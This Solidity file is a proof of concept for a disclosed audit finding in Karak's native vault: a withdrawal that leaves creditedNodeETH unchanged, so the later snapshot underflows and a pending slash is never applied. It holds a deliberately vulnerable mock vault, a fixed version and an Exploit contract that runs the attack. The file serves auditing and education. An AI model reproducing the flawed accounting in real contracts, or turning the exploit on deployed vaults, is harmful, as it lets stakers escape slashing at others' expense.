// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Karak — finishWithdraw pays the node ETH and leaves creditedNodeETH unchanged
    (Pashov, June 2024). _startSnapshot then computes
    nodeBalanceWei = balance - creditedNodeETH and underflows.
    Here the node holds 10 ETH, 8 ETH is credited, and a 4 ETH slash is waiting
    on the snapshot. The withdraw pays all 8 ETH. The snapshot reverts, so the
    4 ETH slash is never applied. The fixed withdraw decreases creditedNodeETH
    and the snapshot returns the 2 ETH that is still in the node. */

contract Eth {
    string public symbol = "ETH";
    uint8 public constant decimals = 18;
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Node {
    Eth public eth;

    constructor(Eth _eth) {
        eth = _eth;
    }

    function withdraw(address to, uint256 amount) external {
        eth.transfer(to, amount);
    }
}

contract NativeVault {
    Eth public eth;
    Node public node;
    uint256 public creditedNodeETH;
    uint256 public pendingSlash;

    constructor(Eth _eth, Node _node) {
        eth = _eth;
        node = _node;
    }

    function credit(uint256 amount) external {
        creditedNodeETH = amount;
    }

    function queueSlash(uint256 amount) external {
        pendingSlash = amount;
    }

    function finishWithdraw(address to, uint256 amount) external {
        node.withdraw(to, amount); // @> VULN: creditedNodeETH is not decreased by amount
    }

    function startSnapshot() external returns (uint256 nodeBalanceWei) {
        nodeBalanceWei = eth.balanceOf(address(node)) - creditedNodeETH;
        if (pendingSlash != 0 && creditedNodeETH >= pendingSlash) {
            creditedNodeETH -= pendingSlash;
            pendingSlash = 0;
        }
    }
}

contract NativeVaultFixed {
    Eth public eth;
    Node public node;
    uint256 public creditedNodeETH;
    uint256 public pendingSlash;

    constructor(Eth _eth, Node _node) {
        eth = _eth;
        node = _node;
    }

    function credit(uint256 amount) external {
        creditedNodeETH = amount;
    }

    function queueSlash(uint256 amount) external {
        pendingSlash = amount;
    }

    function finishWithdraw(address to, uint256 amount) external {
        node.withdraw(to, amount);
        creditedNodeETH -= amount;
    }

    function startSnapshot() external returns (uint256 nodeBalanceWei) {
        nodeBalanceWei = eth.balanceOf(address(node)) - creditedNodeETH;
    }
}

contract Exploit {
    Eth public eth; // nonce 1
    Node public node; // nonce 2
    NativeVault public vault; // nonce 3
    bool public snapshotReverted;

    constructor() {
        eth = new Eth();
        node = new Node(eth);
        vault = new NativeVault(eth, node);
    }

    function run() external {
        eth.mint(address(node), 10 ether);
        vault.credit(8 ether);
        vault.queueSlash(4 ether);
        require(eth.balanceOf(address(node)) == 10 ether, "node 10");
        vault.finishWithdraw(address(this), 8 ether);
        require(eth.balanceOf(address(this)) == 8 ether, "paid 8");
        require(vault.creditedNodeETH() == 8 ether, "credited stuck");
        require(eth.balanceOf(address(node)) == 2 ether, "node 2");
        try vault.startSnapshot() returns (uint256) {
            snapshotReverted = false;
        } catch {
            snapshotReverted = true;
        }
        require(snapshotReverted, "snapshot must revert");
        require(vault.pendingSlash() == 4 ether, "slash not applied");
        require(eth.balanceOf(address(this)) - 4 ether == 4 ether, "4 ETH slash kept");
    }
}
